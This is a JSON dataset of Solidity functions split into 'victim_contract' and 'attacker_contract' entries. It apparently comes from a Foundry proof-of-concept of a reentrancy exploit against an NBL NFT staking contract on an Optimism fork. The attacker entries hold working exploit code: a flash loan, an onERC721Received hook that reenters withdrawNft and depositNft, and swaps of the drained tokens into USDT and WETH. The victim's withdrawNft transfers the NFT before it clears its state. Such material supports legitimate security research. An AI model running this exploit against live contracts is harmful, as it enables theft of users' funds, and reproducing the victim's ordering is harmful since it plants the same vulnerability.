[
  {
    "contract/interface": "IRouterV3",
    "source_type": "victim_contract",
    "function_name": "exactInputSingle",
    "original_code": "    function exactInputSingle(ExactInputSingleParams memory params)\n        external\n        payable\n        override\n        returns (uint256 amountOut)\n    {\n        // use amountIn == Constants.CONTRACT_BALANCE as a flag to swap the entire balance of the contract\n        bool hasAlreadyPaid;\n        if (params.amountIn == Constants.CONTRACT_BALANCE) {\n            hasAlreadyPaid = true;\n            params.amountIn = IERC20(params.tokenIn).balanceOf(address(this));\n        }\n\n        amountOut = exactInputInternal(\n            params.amountIn,\n            params.recipient,\n            params.sqrtPriceLimitX96,\n            SwapCallbackData({\n                path: abi.encodePacked(params.tokenIn, params.fee, params.tokenOut),\n                payer: hasAlreadyPaid ? address(this) : msg.sender\n            })\n        );\n        require(amountOut >= params.amountOutMinimum, 'Too little received');\n    }\n\n    /// @inheritdoc IV3SwapRouter\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "onERC721Received",
    "original_code": "    function onERC721Received(\n        address operator,\n        address from,\n        uint256 tokenId,\n        bytes calldata data\n    ) external returns (bytes4) {\n        if (reenter) {\n            reenter = false;\n            NBF.transferFrom(address(this), address(NblNftStake), 737);\n            NblNftStake.withdrawNft(0);\n            NblNftStake.depositNft(737, 0);\n        }\n        return this.onERC721Received.selector;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"optimism\", 115_293_068);\n        vm.label(address(NBF), \"NBF\");\n        vm.label(address(NBL), \"NBL\");\n        vm.label(address(USDT), \"USDT\");\n        vm.label(address(WETH), \"WETH\");\n        vm.label(address(NBL_USDT), \"NBL_USDT\");\n        vm.label(address(Router), \"Router\");\n        vm.label(address(NblNftStake), \"NblNftStake\");\n        vm.label(exploiterEOA, \"exploiterEOA\");\n        vm.label(mainAttackContract, \"mainAttackContract\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        emit log_named_decimal_uint(\n            \"Exploiter USDT balance before attack\", USDT.balanceOf(address(this)), USDT.decimals()\n        );\n\n        emit log_named_decimal_uint(\n            \"Exploiter WETH balance before attack\", WETH.balanceOf(address(this)), WETH.decimals()\n        );\n\n        // Transfering NBF NFT token (id = 737) from main attack contract to helper attack contract which will be exploiting reentrancy vulnerability\n        vm.prank(mainAttackContract, exploiterEOA);\n        NBF.transferFrom(mainAttackContract, address(this), 737);\n        assertEq(NBF.ownerOf(737), address(this));\n\n        NBL_USDT.flash(address(this), NBL.balanceOf(address(NblNftStake)), 0, \"\");\n\n        NBLToUSDT();\n        NBLToWETH();\n\n        emit log_named_decimal_uint(\n            \"Exploiter USDT balance after attack\", USDT.balanceOf(address(this)), USDT.decimals()\n        );\n\n        emit log_named_decimal_uint(\n            \"Exploiter WETH balance after attack\", WETH.balanceOf(address(this)), WETH.decimals()\n        );\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "uniswapV3FlashCallback",
    "original_code": "    function uniswapV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {\n        USDT.approve(address(Router), type(uint256).max);\n        USDT.approve(address(NblNftStake), type(uint256).max);\n        NBL.approve(address(Router), type(uint256).max);\n        NBL.approve(address(NblNftStake), type(uint256).max);\n        uint256 returnAmount = NBL.balanceOf(address(NblNftStake));\n\n        NBF.setApprovalForAll(address(NblNftStake), true);\n        NblNftStake.unlockSlot();\n        NblNftStake.depositNft(737, 0);\n        NblNftStake.depositNbl(0, NBL.balanceOf(address(this)));\n",
    "description": ""
  },
  {
    "contract/interface": "INblNftStake",
    "source_type": "victim_contract",
    "function_name": "depositNbl",
    "original_code": "    function depositNbl(uint256 _index, uint256 _amount) public {\n        require(_index >= 0 && _index <= 7, \"invalid slot\");\n        require(_amount > 0, \"invalid deposit\");\n        StakeInfo[] storage stakes = userStakeInfo[msg.sender];\n        uint tokenid = stakes[_index].nftTokenId;\n        require(tokenid != 0, \"invalid stake\");\n        require(stakes[_index].nblStakeAmount == 0, \"no dup stake\");\n\n        nbl.safeTransferFrom(msg.sender, address(this), _amount);\n\n        uint multiply = slotPowerMultiplies[stakes.length - 1];\n        uint existingPower = getSlotPower(msg.sender, _index);\n        existingPower = SafeMath.mul(existingPower, multiply) / 100;\n        stakebook.withdraw(msg.sender, existingPower);\n\n        stakes[_index].nblStakeAmount = SafeMath.add(stakes[_index].nblStakeAmount, _amount);\n        uint newPower = getSlotPower(msg.sender, _index);\n        newPower = SafeMath.mul(newPower, multiply) / 100;\n        stakebook.deposit(msg.sender, newPower);\n\n        emit DepositNbl(msg.sender, _index, _amount, newPower);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "INblNftStake",
    "source_type": "victim_contract",
    "function_name": "depositNft",
    "original_code": "    function depositNft(uint256 _tokenid, uint256 _index) public {\n        StakeInfo[] storage stakes = userStakeInfo[msg.sender];\n        require(_index <= stakes.length && _index < 8, \"slot not available\");\n        require(stakes[_index].nftTokenId == 0, \"already staked!\");\n        nft.safeTransferFrom(msg.sender, address(this), _tokenid);\n\n        stakes[_index].nftTokenId = _tokenid;\n        stakes[_index].nblStakeAmount = 0;\n        stakes[_index].begin = block.timestamp;\n\n        // uint power = getNftPower(_tokenid);\n        // stakebook.deposit(msg.sender, power);\n        stakebook.withdrawAll(msg.sender);\n        uint power = calcAllSlotPowerFor(msg.sender);\n        stakebook.deposit(msg.sender, power);\n        emit DepositNft(msg.sender, _tokenid);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "INblNftStake",
    "source_type": "victim_contract",
    "function_name": "unlockSlot",
    "original_code": "    function unlockSlot() public {\n        StakeInfo[] storage stakes = userStakeInfo[msg.sender];\n        require(stakes.length < 8, \"no new slot available\");\n\n        uint index = stakes.length;\n        uint price = slotprices[index];\n\n        if (price > 0) {\n            // usdToken.safeTransferFrom(msg.sender, address(vault), price);\n            // vault.send(address(usdToken), price);\n            usdToken.safeTransferFrom(msg.sender, 0x000000000000000000000000000000000000dEaD, price);\n        }\n\n        userStakeInfo[msg.sender].push(StakeInfo(0, 0, 0, block.timestamp));\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "INblNftStake",
    "source_type": "victim_contract",
    "function_name": "withdrawNft",
    "original_code": "    function withdrawNft(uint256 _index) public {\n        StakeInfo[] storage stakes = userStakeInfo[msg.sender];\n        require(_index < stakes.length, \"invalid stake index\");\n\n        uint tokenid = stakes[_index].nftTokenId;\n        require(tokenid > 0, \"no stake available\");\n\n        uint amount = stakes[_index].nblStakeAmount;\n        uint power = getSlotPower(msg.sender, _index);\n\n        nft.safeTransferFrom(address(this), msg.sender, tokenid);\n        if (stakes[_index].inscriptionId > 0) {\n            inscription.safeTransferFrom(address(this), msg.sender, stakes[_index].inscriptionId);\n        }\n\n        uint discount = calcDiscount(stakes[_index].begin, amount);\n        nbl.safeTransfer(community, discount);\n        nbl.safeTransfer(msg.sender, SafeMath.sub(amount, discount));\n\n        uint multiply = slotPowerMultiplies[stakes.length - 1];\n        power = SafeMath.mul(power, multiply) / 100;\n        stakebook.withdraw(msg.sender, power);\n\n        stakes[_index].nftTokenId = 0;\n        stakes[_index].inscriptionId = 0;\n        stakes[_index].nblStakeAmount = 0;\n        stakes[_index].begin = 0;\n\n        emit WithdrawNft(msg.sender, tokenid);\n    }\n\n",
    "description": ""
  }
]